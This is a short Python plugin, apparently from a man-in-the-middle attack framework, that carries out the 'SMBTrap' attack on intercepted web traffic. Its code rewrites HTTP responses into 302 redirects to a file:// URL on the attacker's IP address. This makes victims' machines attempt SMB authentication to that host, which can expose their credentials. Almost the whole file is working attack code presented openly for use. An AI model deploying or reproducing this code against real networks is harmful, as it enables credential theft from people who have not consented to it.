# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import random
import string

from plugins.plugin import Plugin

class SMBTrap(Plugin):
	name = "SMBTrap"
	optname = "smbtrap"
	desc = "Exploits the SMBTrap vulnerability on connected clients"
	version = "1.0"

	def initialize(self, options):
		self.ip = options.ip

	def responsestatus(self, request, version, code, message):
		return {"request": request, "version": version, "code": 302, "message": "Found"}

	def responseheaders(self, response, request):
		self.clientlog.info("Trapping request to {}".format(request.headers['host']), extra=request.clientInfo)
		rand_path = ''.join(random.sample(string.ascii_uppercase + string.digits, 8))
		response.responseHeaders.setRawHeaders('Location', ["file://{}/{}".format(self.ip, rand_path)])
